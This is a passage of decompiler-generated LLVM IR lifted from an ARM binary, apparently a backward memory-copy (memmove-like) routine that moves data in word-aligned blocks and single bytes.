  %v5_14d60 = inttoptr i32 %v4_14d60 to i32*
  %v6_14d60 = load i32, i32* %v5_14d60, align 4
  store i32 %v6_14d60, i32* %r4.global-to-local, align 4
  %v7_14d60 = add i32 %v0_14d60, -12
  %v8_14d60 = inttoptr i32 %v7_14d60 to i32*
  %v9_14d60 = load i32, i32* %v8_14d60, align 4
  store i32 %v9_14d60, i32* %ip.global-to-local, align 4
  %v10_14d60 = add i32 %v0_14d60, -16
  %v11_14d60 = inttoptr i32 %v10_14d60 to i32*
  %v12_14d60 = load i32, i32* %v11_14d60, align 4
  store i32 %v12_14d60, i32* %lr.global-to-local, align 4
  store i32 %v10_14d60, i32* %r1.global-to-local, align 4
  %v1_14d64 = add i32 %v0_14d64, -16
  %v2_14d64 = inttoptr i32 %v1_14d64 to i32*
  store i32 %v3_14d60, i32* %v2_14d64, align 4
  %v4_14d64 = add i32 %v0_14d64, -12
  %v5_14d64 = inttoptr i32 %v4_14d64 to i32*
  %v6_14d64 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14d64, i32* %v5_14d64, align 4
  %v7_14d64 = add i32 %v0_14d64, -8
  %v8_14d64 = inttoptr i32 %v7_14d64 to i32*
  %v9_14d64 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_14d64, i32* %v8_14d64, align 4
  %v10_14d64 = add i32 %v0_14d64, -4
  %v11_14d64 = inttoptr i32 %v10_14d64 to i32*
  %v12_14d64 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14d64, i32* %v11_14d64, align 4
  store i32 %v1_14d64, i32* %r0.global-to-local, align 4
  %v0_14d68 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d68 = add i32 %v0_14d68, -4
  %v2_14d68 = inttoptr i32 %v1_14d68 to i32*
  %v3_14d68 = load i32, i32* %v2_14d68, align 4
  store i32 %v3_14d68, i32* %r3.global-to-local, align 4
  %v4_14d68 = add i32 %v0_14d68, -8
  %v5_14d68 = inttoptr i32 %v4_14d68 to i32*
  %v6_14d68 = load i32, i32* %v5_14d68, align 4
  store i32 %v6_14d68, i32* %r4.global-to-local, align 4
  %v7_14d68 = add i32 %v0_14d68, -12
  %v8_14d68 = inttoptr i32 %v7_14d68 to i32*
  %v9_14d68 = load i32, i32* %v8_14d68, align 4
  store i32 %v9_14d68, i32* @ip, align 4
  %v10_14d68 = add i32 %v0_14d68, -16
  %v11_14d68 = inttoptr i32 %v10_14d68 to i32*
  %v12_14d68 = load i32, i32* %v11_14d68, align 4
  store i32 %v12_14d68, i32* %lr.global-to-local, align 4
  store i32 %v10_14d68, i32* @r1, align 4
  %v1_14d6c = add i32 %v0_14d64, -32
  %v2_14d6c = inttoptr i32 %v1_14d6c to i32*
  store i32 %v3_14d68, i32* %v2_14d6c, align 4
  %v4_14d6c = add i32 %v0_14d64, -28
  %v5_14d6c = inttoptr i32 %v4_14d6c to i32*
  %v6_14d6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14d6c, i32* %v5_14d6c, align 4
  %v7_14d6c = add i32 %v0_14d64, -24
  %v8_14d6c = inttoptr i32 %v7_14d6c to i32*
  %v9_14d6c = load i32, i32* @ip, align 4
  store i32 %v9_14d6c, i32* %v8_14d6c, align 4
  %v10_14d6c = add i32 %v0_14d64, -20
  %v11_14d6c = inttoptr i32 %v10_14d6c to i32*
  %v12_14d6c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14d6c, i32* %v11_14d6c, align 4
  store i32 %v1_14d6c, i32* %r0.global-to-local, align 4
  %v0_14d70 = load i32, i32* %r2.global-to-local, align 4
  %v2_14d70 = add i32 %v0_14d70, -32
  store i32 %v2_14d70, i32* %r2.global-to-local, align 4
  %v6_14d74 = icmp slt i32 %v0_14d70, 32
  br i1 %v6_14d74, label %dec_label_pc_14d78.loopexit, label %dec_label_pc_14d60.dec_label_pc_14d60_crit_edge

dec_label_pc_14d60.dec_label_pc_14d60_crit_edge:  ; preds = %dec_label_pc_14d60
  %v0_14d60.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d78.loopexit:                      ; preds = %dec_label_pc_14d60
  %v4_14d70 = sub i32 31, %v0_14d70
  %v5_14d70 = and i32 %v4_14d70, %v0_14d70
  %v6_14d70 = icmp slt i32 %v5_14d70, 0
  %v7_14d70 = icmp slt i32 %v2_14d70, 0
  store i1 %v6_14d70, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14d70, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14d78

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d78.loopexit, %dec_label_pc_14d54
  %v6_14d80 = phi i32 [ %v1_14d6c, %dec_label_pc_14d78.loopexit ], [ %v0_14d6449, %dec_label_pc_14d54 ]
  %v0_14d88.pr = phi i32 [ %v2_14d70, %dec_label_pc_14d78.loopexit ], [ %v2_14d58, %dec_label_pc_14d54 ]
  %v4_14d78 = add i32 %v0_14d88.pr, 16
  %v6_14d78 = sub i32 0, %v0_14d88.pr
  %v7_14d78 = and i32 %v4_14d78, %v6_14d78
  %v8_14d78 = icmp slt i32 %v7_14d78, 0
  store i1 %v8_14d78, i1* %cpsr_v.global-to-local, align 1
  %v9_14d78 = icmp slt i32 %v4_14d78, 0
  store i1 %v9_14d78, i1* %cpsr_n.global-to-local, align 1
  %v5_14d7c = icmp slt i32 %v0_14d88.pr, -16
  br i1 %v5_14d7c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_14d78
  %v6_14d7c = load i32, i32* @r1, align 4
  %v7_14d7c = add i32 %v6_14d7c, -4
  %v8_14d7c = inttoptr i32 %v7_14d7c to i32*
  %v9_14d7c = load i32, i32* %v8_14d7c, align 4
  store i32 %v9_14d7c, i32* %r3.global-to-local, align 4
  %v10_14d7c = add i32 %v6_14d7c, -8
  %v11_14d7c = inttoptr i32 %v10_14d7c to i32*
  %v12_14d7c = load i32, i32* %v11_14d7c, align 4
  store i32 %v12_14d7c, i32* %r4.global-to-local, align 4
  %v13_14d7c = add i32 %v6_14d7c, -12
  %v14_14d7c = inttoptr i32 %v13_14d7c to i32*
  %v15_14d7c = load i32, i32* %v14_14d7c, align 4
  store i32 %v15_14d7c, i32* @ip, align 4
  %v16_14d7c = add i32 %v6_14d7c, -16
  %v17_14d7c = inttoptr i32 %v16_14d7c to i32*
  %v18_14d7c = load i32, i32* %v17_14d7c, align 4
  store i32 %v18_14d7c, i32* %lr.global-to-local, align 4
  store i32 %v16_14d7c, i32* @r1, align 4
  %v7_14d80 = add i32 %v6_14d80, -16
  %v8_14d80 = inttoptr i32 %v7_14d80 to i32*
  store i32 %v9_14d7c, i32* %v8_14d80, align 4
  %v10_14d80 = add i32 %v6_14d80, -12
  %v11_14d80 = inttoptr i32 %v10_14d80 to i32*
  %v12_14d80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_14d80, i32* %v11_14d80, align 4
  %v13_14d80 = add i32 %v6_14d80, -8
  %v14_14d80 = inttoptr i32 %v13_14d80 to i32*
  %v15_14d80 = load i32, i32* @ip, align 4
  store i32 %v15_14d80, i32* %v14_14d80, align 4
  %v16_14d80 = add i32 %v6_14d80, -4
  %v17_14d80 = inttoptr i32 %v16_14d80 to i32*
  %v18_14d80 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_14d80, i32* %v17_14d80, align 4
  store i32 %v7_14d80, i32* %r0.global-to-local, align 4
  %v6_14d84 = load i32, i32* %r2.global-to-local, align 4
  %v7_14d84 = add i32 %v6_14d84, -16
  store i32 %v7_14d84, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_14d78, %bb140
  %v6_14d90 = phi i32 [ %v7_14d80, %bb140 ], [ %v6_14d80, %dec_label_pc_14d78 ]
  %v0_14d88 = phi i32 [ %v7_14d84, %bb140 ], [ %v0_14d88.pr, %dec_label_pc_14d78 ]
  %v4_14d88 = add i32 %v0_14d88, 20
  store i32 %v4_14d88, i32* %r2.global-to-local, align 4
  %v6_14d88 = sub i32 0, %v0_14d88
  %v7_14d88 = and i32 %v4_14d88, %v6_14d88
  %v8_14d88 = icmp slt i32 %v7_14d88, 0
  store i1 %v8_14d88, i1* %cpsr_v.global-to-local, align 1
  %v9_14d88 = icmp slt i32 %v4_14d88, 0
  store i1 %v9_14d88, i1* %cpsr_n.global-to-local, align 1
  %v5_14d8c = icmp slt i32 %v0_14d88, -20
  br i1 %v5_14d8c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_14d8c = load i32, i32* @r1, align 4
  %v7_14d8c = add i32 %v6_14d8c, -4
  %v8_14d8c = inttoptr i32 %v7_14d8c to i32*
  %v9_14d8c = load i32, i32* %v8_14d8c, align 4
  store i32 %v9_14d8c, i32* %r3.global-to-local, align 4
  %v10_14d8c = add i32 %v6_14d8c, -8
  %v11_14d8c = inttoptr i32 %v10_14d8c to i32*
  %v12_14d8c = load i32, i32* %v11_14d8c, align 4
  store i32 %v12_14d8c, i32* @ip, align 4
  %v13_14d8c = add i32 %v6_14d8c, -12
  %v14_14d8c = inttoptr i32 %v13_14d8c to i32*
  %v15_14d8c = load i32, i32* %v14_14d8c, align 4
  store i32 %v15_14d8c, i32* %lr.global-to-local, align 4
  store i32 %v13_14d8c, i32* @r1, align 4
  %v7_14d90 = add i32 %v6_14d90, -12
  %v8_14d90 = inttoptr i32 %v7_14d90 to i32*
  store i32 %v9_14d8c, i32* %v8_14d90, align 4
  %v10_14d90 = add i32 %v6_14d90, -8
  %v11_14d90 = inttoptr i32 %v10_14d90 to i32*
  %v12_14d90 = load i32, i32* @ip, align 4
  store i32 %v12_14d90, i32* %v11_14d90, align 4
  %v13_14d90 = add i32 %v6_14d90, -4
  %v14_14d90 = inttoptr i32 %v13_14d90 to i32*
  %v15_14d90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_14d90, i32* %v14_14d90, align 4
  store i32 %v7_14d90, i32* %r0.global-to-local, align 4
  %v6_14d94 = load i32, i32* %r2.global-to-local, align 4
  %v7_14d94 = add i32 %v6_14d94, -12
  store i32 %v7_14d94, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_14db457 = phi i32 [ %v6_14d90, %.thread14 ], [ %v7_14d90, %bb141 ]
  %v0_14d9c55 = phi i32 [ %v4_14d88, %.thread14 ], [ %v7_14d94, %bb141 ]
  %v2_14d98 = load i8*, i8** %stack_var_-8, align 4
  %v3_14d98 = ptrtoint i8* %v2_14d98 to i32
  store i32 %v3_14d98, i32* @r4, align 4
  store i32 %v8_14d54, i32* @lr, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d4c, %.thread16
  %v7_14dac = phi i32 [ %v0_14d6449, %dec_label_pc_14d4c ], [ %v6_14db457, %.thread16 ]
  %v0_14d9c = phi i32 [ %v2_14d4c, %dec_label_pc_14d4c ], [ %v0_14d9c55, %.thread16 ]
  %v2_14d9c = add i32 %v0_14d9c, 8
  store i32 %v2_14d9c, i32* %r2.global-to-local, align 4
  %v4_14d9c = sub i32 0, %v0_14d9c
  %v5_14d9c = and i32 %v2_14d9c, %v4_14d9c
  %v6_14d9c = icmp slt i32 %v5_14d9c, 0
  store i1 %v6_14d9c, i1* %cpsr_v.global-to-local, align 1
  %v7_14d9c = icmp slt i32 %v2_14d9c, 0
  store i1 %v7_14d9c, i1* %cpsr_n.global-to-local, align 1
  %v5_14da0 = icmp slt i32 %v0_14d9c, -8
  br i1 %v5_14da0, label %bb143, label %dec_label_pc_14da4

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d9c
  %v6_14da4 = add i32 %v0_14d9c, 4
  store i32 %v6_14da4, i32* %r2.global-to-local, align 4
  %v8_14da4 = sub i32 -5, %v0_14d9c
  %v9_14da4 = and i32 %v8_14da4, %v2_14d9c
  %v10_14da4 = icmp slt i32 %v9_14da4, 0
  store i1 %v10_14da4, i1* %cpsr_v.global-to-local, align 1
  %v11_14da4 = icmp slt i32 %v6_14da4, 0
  store i1 %v11_14da4, i1* %cpsr_n.global-to-local, align 1
  %v5_14da8 = icmp slt i32 %v2_14d9c, 4
  %v6_14da8 = load i32, i32* @r1, align 4
  %v7_14da8 = add i32 %v6_14da8, -4
  %v8_14da8 = inttoptr i32 %v7_14da8 to i32*
  %v9_14da8 = load i32, i32* %v8_14da8, align 4
  store i32 %v9_14da8, i32* %r3.global-to-local, align 4
  br i1 %v5_14da8, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_14da4
  store i32 %v7_14da8, i32* @r1, align 4
  %v8_14dac = add i32 %v7_14dac, -4
  %v9_14dac = inttoptr i32 %v8_14dac to i32*
  store i32 %v9_14da8, i32* %v9_14dac, align 4
  %v10_14dac = load i32, i32* %r0.global-to-local, align 4
  %v11_14dac = add i32 %v10_14dac, -4
  store i32 %v11_14dac, i32* %r0.global-to-local, align 4
  %v0_14dbc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_14da4
  %v10_14db0 = add i32 %v6_14da8, -8
  %v11_14db0 = inttoptr i32 %v10_14db0 to i32*
  %v12_14db0 = load i32, i32* %v11_14db0, align 4
  store i32 %v12_14db0, i32* @ip, align 4
  store i32 %v10_14db0, i32* @r1, align 4
  %v7_14db4 = add i32 %v7_14dac, -8
  %v8_14db4 = inttoptr i32 %v7_14db4 to i32*
  store i32 %v9_14da8, i32* %v8_14db4, align 4
  %v10_14db4 = add i32 %v7_14dac, -4
  %v11_14db4 = inttoptr i32 %v10_14db4 to i32*
  %v12_14db4 = load i32, i32* @ip, align 4
  store i32 %v12_14db4, i32* %v11_14db4, align 4
  store i32 %v7_14db4, i32* %r0.global-to-local, align 4
  %v6_14db8 = load i32, i32* %r2.global-to-local, align 4
  %v7_14db8 = add i32 %v6_14db8, -4
  store i32 %v7_14db8, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_14d9c, %dec_label_pc_14d2c, %dec_label_pc_14f60, %dec_label_pc_14ef4, %dec_label_pc_14e88, %bb142
  %v2_14dc0 = phi i32 [ %v11_14dac, %.thread20 ], [ %v0_14e5832, %.thread26 ], [ %v7_14dac, %dec_label_pc_14d9c ], [ %v2_14d30, %dec_label_pc_14d2c ], [ %v2_14dcc65, %dec_label_pc_14f60 ], [ %v2_14dcc64, %dec_label_pc_14ef4 ], [ %v2_14dcc63, %dec_label_pc_14e88 ], [ %v7_14db4, %bb142 ]
  %v0_14dbc = phi i32 [ %v0_14dbc.pre, %.thread20 ], [ %v2_14e00, %.thread26 ], [ %v2_14d9c, %dec_label_pc_14d9c ], [ %v2_14d34, %dec_label_pc_14d2c ], [ %v0_14dbc61, %dec_label_pc_14f60 ], [ %v0_14dbc60, %dec_label_pc_14ef4 ], [ %v0_14dbc59, %dec_label_pc_14e88 ], [ %v7_14db8, %bb142 ]
  %v1_14dbc = add i32 %v0_14dbc, 4
  store i32 %v1_14dbc, i32* @r2, align 4
  %v3_14dbc = sub i32 0, %v0_14dbc
  %v4_14dbc = and i32 %v1_14dbc, %v3_14dbc
  %v5_14dbc = icmp slt i32 %v4_14dbc, 0
  store i1 %v5_14dbc, i1* %cpsr_v.global-to-local, align 1
  %v6_14dbc = icmp slt i32 %v1_14dbc, 0
  store i1 %v6_14dbc, i1* %cpsr_n.global-to-local, align 1
  %v7_14dbc = icmp eq i32 %v1_14dbc, 0
  store i1 %v7_14dbc, i1* @cpsr_z, align 1
  br i1 %v7_14dbc, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_14dc4 = add i32 %v0_14dbc, 2
  %v3_14dc4 = sub i32 -3, %v0_14dbc
  %v4_14dc4 = and i32 %v3_14dc4, %v1_14dbc
  %v5_14dc4 = icmp slt i32 %v4_14dc4, 0
  store i1 %v5_14dc4, i1* %cpsr_v.global-to-local, align 1
  %v6_14dc4 = icmp slt i32 %v1_14dc4, 0
  store i1 %v6_14dc4, i1* %cpsr_n.global-to-local, align 1
  %v7_14dc4 = icmp eq i32 %v1_14dbc, 2
  store i1 %v7_14dc4, i1* @cpsr_z, align 1
  %v0_14dc8 = load i32, i32* @r1, align 4
  %v1_14dc8 = add i32 %v0_14dc8, -1
  %v2_14dc8 = inttoptr i32 %v1_14dc8 to i8*
  %v3_14dc8 = load i8, i8* %v2_14dc8, align 1
  %v4_14dc8 = zext i8 %v3_14dc8 to i32
  store i32 %v4_14dc8, i32* %r3.global-to-local, align 4
  store i32 %v1_14dc8, i32* @r1, align 4
  %v3_14dcc = add i32 %v2_14dc0, -1
  %v4_14dcc = inttoptr i32 %v3_14dcc to i8*
  store i8 %v3_14dc8, i8* %v4_14dcc, align 1
  %v5_14dcc = load i32, i32* %r0.global-to-local, align 4
  %v6_14dcc = add i32 %v5_14dcc, -1
  store i32 %v6_14dcc, i32* %r0.global-to-local, align 4
  %v0_14dd0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14dd0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14dd0 = xor i1 %v0_14dd0, %v1_14dd0
  br i1 %v2_14dd0, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_14dd0 = load i32, i32* @r1, align 4
  %v4_14dd0 = add i32 %v3_14dd0, -1
  %v5_14dd0 = inttoptr i32 %v4_14dd0 to i8*
  %v6_14dd0 = load i8, i8* %v5_14dd0, align 1
  %v7_14dd0 = zext i8 %v6_14dd0 to i32
  store i32 %v7_14dd0, i32* %r3.global-to-local, align 4
  store i32 %v4_14dd0, i32* @r1, align 4
  %v6_14dd4 = add i32 %v5_14dcc, -2
  %v7_14dd4 = inttoptr i32 %v6_14dd4 to i8*
  store i8 %v6_14dd0, i8* %v7_14dd4, align 1
  %v8_14dd4 = load i32, i32* %r0.global-to-local, align 4
  %v9_14dd4 = add i32 %v8_14dd4, -1
  store i32 %v9_14dd4, i32* %r0.global-to-local, align 4
  %v1_14dd8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14dd8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_14ddc = phi i32 [ %v9_14dd4, %bb145 ], [ %v6_14dcc, %bb144 ]
  %v2_14ddc = phi i1 [ %v2_14dd8.pre, %bb145 ], [ %v1_14dd0, %bb144 ]
  %v1_14ddc = phi i1 [ %v1_14dd8.pre, %bb145 ], [ %v0_14dd0, %bb144 ]
  %v0_14dd8 = load i1, i1* @cpsr_z, align 1
  %v3_14dd8 = xor i1 %v2_14ddc, %v1_14ddc
  %v4_14dd8 = or i1 %v0_14dd8, %v3_14dd8
  br i1 %v4_14dd8, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_14dd8 = load i32, i32* @r1, align 4
  %v6_14dd8 = add i32 %v5_14dd8, -1
  %v7_14dd8 = inttoptr i32 %v6_14dd8 to i8*
  %v8_14dd8 = load i8, i8* %v7_14dd8, align 1
  %v9_14dd8 = zext i8 %v8_14dd8 to i32
  store i32 %v9_14dd8, i32* %r3.global-to-local, align 4
  store i32 %v6_14dd8, i32* @r1, align 4
  %v8_14ddc = add i32 %v7_14ddc, -1
  %v9_14ddc = inttoptr i32 %v8_14ddc to i8*
  store i8 %v8_14dd8, i8* %v9_14ddc, align 1
  %v10_14ddc = load i32, i32* %r0.global-to-local, align 4
  %v11_14ddc = add i32 %v10_14ddc, -1
  store i32 %v11_14ddc, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_14de4:                               ; preds = %dec_label_pc_14d3c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14de4 = icmp eq i32 %v1_14d3c, 1
  store i1 %v8_14de4, i1* %cpsr_n.global-to-local, align 1
  %v1_14de8 = add i32 %v2_14d2c, -1
  %v2_14de8 = inttoptr i32 %v1_14de8 to i8*
  %v3_14de8 = load i8, i8* %v2_14de8, align 1
  %v4_14de8 = zext i8 %v3_14de8 to i32
  store i32 %v4_14de8, i32* %r3.global-to-local, align 4
  store i32 %v1_14de8, i32* @r1, align 4
  %v3_14dec = add i32 %v2_14d30, -1
  %v4_14dec = inttoptr i32 %v3_14dec to i8*
  store i8 %v3_14de8, i8* %v4_14dec, align 1
  %v5_14dec = load i32, i32* %r0.global-to-local, align 4
  %v6_14dec = add i32 %v5_14dec, -1
  store i32 %v6_14dec, i32* %r0.global-to-local, align 4
  br i1 %v8_14de4, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_14de4
  %v9_14de4 = icmp eq i32 %v1_14d3c, 2
  %v6_14df0 = load i32, i32* @r1, align 4
  %v7_14df0 = add i32 %v6_14df0, -1
  %v8_14df0 = inttoptr i32 %v7_14df0 to i8*
  %v9_14df0 = load i8, i8* %v8_14df0, align 1
  %v10_14df0 = zext i8 %v9_14df0 to i32
  store i32 %v10_14df0, i32* %r3.global-to-local, align 4
  store i32 %v7_14df0, i32* @r1, align 4
  %v9_14df4 = add i32 %v5_14dec, -2
  %v10_14df4 = inttoptr i32 %v9_14df4 to i8*
  store i8 %v9_14df0, i8* %v10_14df4, align 1
  %v11_14df4 = load i32, i32* %r0.global-to-local, align 4
  %v12_14df4 = add i32 %v11_14df4, -1
  store i32 %v12_14df4, i32* %r0.global-to-local, align 4
  br i1 %v9_14de4, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_14df8 = load i32, i32* @r1, align 4
  %v9_14df8 = add i32 %v8_14df8, -1
  %v10_14df8 = inttoptr i32 %v9_14df8 to i8*
  %v11_14df8 = load i8, i8* %v10_14df8, align 1
  %v12_14df8 = zext i8 %v11_14df8 to i32
  store i32 %v12_14df8, i32* %r3.global-to-local, align 4
  store i32 %v9_14df8, i32* @r1, align 4
  %v11_14dfc = add i32 %v11_14df4, -2
  %v12_14dfc = inttoptr i32 %v11_14dfc to i8*
  store i8 %v11_14df8, i8* %v12_14dfc, align 1
  %v13_14dfc = load i32, i32* %r0.global-to-local, align 4
  %v14_14dfc = add i32 %v13_14dfc, -1
  store i32 %v14_14dfc, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_14de4, %bb148
  %v0_14e5832 = phi i32 [ %v12_14df4, %bb147 ], [ %v6_14dec, %dec_label_pc_14de4 ], [ %v14_14dfc, %bb148 ]
  %v0_14e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e00 = load i32, i32* @ip, align 4
  %v2_14e00 = sub i32 %v0_14e00, %v1_14e00
  store i32 %v2_14e00, i32* %r2.global-to-local, align 4
  %v4_14e00 = xor i32 %v1_14e00, %v0_14e00
  %v5_14e00 = xor i32 %v2_14e00, %v0_14e00
  %v6_14e00 = and i32 %v5_14e00, %v4_14e00
  %v7_14e00 = icmp slt i32 %v6_14e00, 0
  store i1 %v7_14e00, i1* %cpsr_v.global-to-local, align 1
  %v8_14e00 = icmp slt i32 %v2_14e00, 0
  store i1 %v8_14e00, i1* %cpsr_n.global-to-local, align 1
  %v5_14e04 = icmp slt i32 %v0_14e00, %v1_14e00
  br i1 %v5_14e04, label %bb143, label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %.thread26
  %v0_14e08 = load i32, i32* @r1, align 4
  %v1_14e08 = urem i32 %v0_14e08, 4
  store i32 %v1_14e08, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14e08 = icmp eq i32 %v1_14e08, 0
  br i1 %v2_14e08, label %dec_label_pc_14d4c, label %dec_label_pc_14e10

dec_label_pc_14e10:                               ; preds = %dec_label_pc_14d44, %dec_label_pc_14e08
  %v0_14e5831 = phi i32 [ %v2_14d30, %dec_label_pc_14d44 ], [ %v0_14e5832, %dec_label_pc_14e08 ]
  %v0_14f04 = phi i32 [ %v2_14d34, %dec_label_pc_14d44 ], [ %v2_14e00, %dec_label_pc_14e08 ]
  %v0_14e10 = phi i32 [ %v2_14d2c, %dec_label_pc_14d44 ], [ %v0_14e08, %dec_label_pc_14e08 ]
  %v0_14e18 = phi i32 [ %v1_14d44, %dec_label_pc_14d44 ], [ %v1_14e08, %dec_label_pc_14e08 ]
  %v1_14e10 = and i32 %v0_14e10, -4
  store i32 %v1_14e10, i32* %r1.global-to-local, align 4
  %v1_14e14 = inttoptr i32 %v1_14e10 to i32*
  %v2_14e14 = load i32, i32* %v1_14e14, align 4
  store i32 %v2_14e14, i32* %r3.global-to-local, align 4
  %v7_14e18 = icmp ult i32 %v0_14e18, 2
  %v2_14efc = add i32 %v0_14f04, -12
  %v4_14efc = sub i32 11, %v0_14f04
  %v5_14efc = and i32 %v4_14efc, %v0_14f04
  %v6_14efc = icmp slt i32 %v5_14efc, 0
  store i1 %v6_14efc, i1* %cpsr_v.global-to-local, align 1
  %v7_14efc = icmp slt i32 %v2_14efc, 0
  store i1 %v7_14efc, i1* %cpsr_n.global-to-local, align 1
  %v5_14f00 = icmp slt i32 %v0_14f04, 12
  br i1 %v7_14e18, label %dec_label_pc_14efc, label %dec_label_pc_14e20

dec_label_pc_14e20:                               ; preds = %dec_label_pc_14e10
  %v8_14e18 = icmp eq i32 %v0_14e18, 2
  br i1 %v8_14e18, label %dec_label_pc_14e90, label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14e20
  br i1 %v5_14f00, label %dec_label_pc_14e70, label %dec_label_pc_14e2c

dec_label_pc_14e2c:                               ; preds = %dec_label_pc_14e24
  store i32 %v2_14efc, i32* %r2.global-to-local, align 4
  %v3_14e30 = load i32, i32* @r4, align 4
  store i32 %v3_14e30, i32* %stack_var_-12, align 4
  %v6_14e30 = load i32, i32* @r5, align 4
  %v8_14e30 = inttoptr i32 %v6_14e30 to i8*
  store i8* %v8_14e30, i8** %stack_var_-8, align 4
  %v11_14e30 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14e34

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e34.dec_label_pc_14e34_crit_edge, %dec_label_pc_14e2c
  %v0_14e58 = phi i32 [ %v1_14e58, %dec_label_pc_14e34.dec_label_pc_14e34_crit_edge ], [ %v0_14e5831, %dec_label_pc_14e2c ]
  %v0_14e38 = phi i32 [ %v0_14e38.pre, %dec_label_pc_14e34.dec_label_pc_14e34_crit_edge ], [ %v1_14e10, %dec_label_pc_14e2c ]
  %v0_14e34 = phi i32 [ %v0_14e34.pre, %dec_label_pc_14e34.dec_label_pc_14e34_crit_edge ], [ %v2_14e14, %dec_label_pc_14e2c ]
  %v3_14e34 = mul i32 %v0_14e34, 256
  store i32 %v3_14e34, i32* %lr.global-to-local, align 4
  %v1_14e38 = add i32 %v0_14e38, -4
  %v2_14e38 = inttoptr i32 %v1_14e38 to i32*
  %v3_14e38 = load i32, i32* %v2_14e38, align 4
  store i32 %v3_14e38, i32* %r3.global-to-local, align 4
  %v4_14e38 = add i32 %v0_14e38, -8
  %v5_14e38 = inttoptr i32 %v4_14e38 to i32*
  %v6_14e38 = load i32, i32* %v5_14e38, align 4
  store i32 %v6_14e38, i32* %r4.global-to-local, align 4
  %v7_14e38 = add i32 %v0_14e38, -12
  %v8_14e38 = inttoptr i32 %v7_14e38 to i32*
  %v9_14e38 = load i32, i32* %v8_14e38, align 4
  store i32 %v9_14e38, i32* %r5.global-to-local, align 4
  %v10_14e38 = add i32 %v0_14e38, -16
  %v11_14e38 = inttoptr i32 %v10_14e38 to i32*
  %v12_14e38 = load i32, i32* %v11_14e38, align 4
  store i32 %v10_14e38, i32* %r1.global-to-local, align 4
  %v4_14e3c = udiv i32 %v12_14e38, 16777216
  %v5_14e3c = or i32 %v4_14e3c, %v3_14e34
  store i32 %v5_14e3c, i32* %lr.global-to-local, align 4
  %v3_14e40 = mul i32 %v12_14e38, 256
  %v4_14e44 = udiv i32 %v9_14e38, 16777216
  %v5_14e44 = or i32 %v3_14e40, %v4_14e44
  store i32 %v5_14e44, i32* @ip, align 4
  %v3_14e48 = mul i32 %v9_14e38, 256
  %v4_14e4c = udiv i32 %v6_14e38, 16777216
  %v5_14e4c = or i32 %v3_14e48, %v4_14e4c
  store i32 %v5_14e4c, i32* %r5.global-to-local, align 4
  %v3_14e50 = mul i32 %v6_14e38, 256
  %v4_14e54 = udiv i32 %v3_14e38, 16777216
  %v5_14e54 = or i32 %v3_14e50, %v4_14e54
  store i32 %v5_14e54, i32* %r4.global-to-local, align 4
  %v1_14e58 = add i32 %v0_14e58, -16
  %v2_14e58 = inttoptr i32 %v1_14e58 to i32*
  store i32 %v5_14e54, i32* %v2_14e58, align 4
  %v4_14e58 = add i32 %v0_14e58, -12
  %v5_14e58 = inttoptr i32 %v4_14e58 to i32*
  %v6_14e58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14e58, i32* %v5_14e58, align 4
  %v7_14e58 = add i32 %v0_14e58, -8
  %v8_14e58 = inttoptr i32 %v7_14e58 to i32*
  %v9_14e58 = load i32, i32* @ip, align 4
  store i32 %v9_14e58, i32* %v8_14e58, align 4
  %v10_14e58 = add i32 %v0_14e58, -4
  %v11_14e58 = inttoptr i32 %v10_14e58 to i32*
  %v12_14e58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14e58, i32* %v11_14e58, align 4
  store i32 %v1_14e58, i32* %r0.global-to-local, align 4
  %v0_14e5c = load i32, i32* %r2.global-to-local, align 4
  %v2_14e5c = add i32 %v0_14e5c, -16
  store i32 %v2_14e5c, i32* %r2.global-to-local, align 4
  %v6_14e60 = icmp slt i32 %v0_14e5c, 16
  br i1 %v6_14e60, label %dec_label_pc_14e64, label %dec_label_pc_14e34.dec_label_pc_14e34_crit_edge

